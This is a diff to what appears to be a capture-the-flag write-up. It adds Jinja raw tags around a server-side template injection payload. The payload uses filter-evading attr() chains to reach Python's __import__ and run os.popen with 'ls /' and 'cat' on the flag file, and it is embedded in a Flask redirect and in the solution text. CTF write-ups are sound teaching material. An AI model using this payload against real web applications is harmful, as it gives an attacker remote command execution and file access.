@@ -95,8 +95,8 @@ def catch(path):
         resp = Response("")
         resp.headers ['Content-Type'] = 'text/x-component'
         return resp
-    return redirect("http://0.0.0.0:3000/home?token=ced507500890ab628c7edf15fbe9df2f&directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=ls%20/")
-    #return redirect("http://0.0.0.0:3000/home?token=ced507500890ab628c7edf15fbe9df2f&directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=cat%20/flag960bbeb43c.txt")
+    return redirect("http://0.0.0.0:3000/home?token=ced507500890ab628c7edf15fbe9df2f&directory={% raw %}{%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=ls%20/")
+    #return redirect("http://0.0.0.0:3000/home?token=ced507500890ab628c7edf15fbe9df2f&directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=cat%20/flag960bbeb43c.txt"){% endraw %}
 
     
 app.run(host="0.0.0.0", port=8081, debug=False)
@@ -108,11 +108,11 @@ So as you can see the payload is the following:
 <pre><code class="language-python">
 List the files in / cause from the code flag.txt is modified like flag[random-chars].txt
 
-directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=ls%20/" 
+directory={% raw %}{%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=ls%20/" 
 {%endraw}
 
 Cat flag
 
-directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=cat%20/flag960bbeb43c.txt
+directory={% raw %}{%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=cat%20/flag960bbeb43c.txt{% endraw %}
 </code></pre>
 ```
